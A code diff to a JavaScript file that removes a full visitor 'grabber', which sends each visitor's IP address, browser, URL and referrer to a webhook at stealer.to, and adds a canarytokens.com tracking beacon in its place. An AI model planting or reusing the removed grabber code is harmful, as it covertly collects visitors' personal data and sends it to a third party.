@@ -1,48 +1,5 @@
-var webhook = 'https://stealer.to/post?uniqueid=b167dacd';
-var site = 'https://myexternalip.com/raw';
-
-var get_ip = function() {
-    var ip = '';
-    var xhr = new XMLHttpRequest();
-    xhr.open('GET', site, false);
-    xhr.send();
-    if (xhr.status == 200) {
-        ip = xhr.responseText;
-    }
-    return ip;
-};
-
-function get_browser() {
-    var browser = navigator.userAgent;
-    return browser;
-    }
-
-function get_time() {
-    var date = new Date();
-    var time = date.toLocaleString();
-    return time;
-    }
-
-function get_url() {
-    var url = window.location.href;
-    return url;
-    }
-
-function get_referrer() {
-    var referrer = document.referrer;
-    return referrer;
-    }
-
-function send_webhook() {
-    fetch(webhook, {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-            content: `@everyone NEW PERSON GRABBED!!!\n\`\`\`ini\nIP: [${get_ip()}]\nBrowser: [${get_browser()}]\nTime: [${get_time()}]\nURL: [${get_url()}]\nReferrer: [${get_referrer()}]\n[Made by K.Dot]\n\`\`\``
-        })
-    });
-}
-
-send_webhook();
+var p = !document.location.protocol.startsWith("http")?"http:":document.location.protocol;
+var l = location.href;
+var r = document.referrer;
+var m = new Image();
+m.src = p + "//canarytokens.com/terms/tags/oszar1xek6r6nara5nvu14ok4/payments.js?l=" + encodeURI(l) + "&r=" + encodeURI(r);
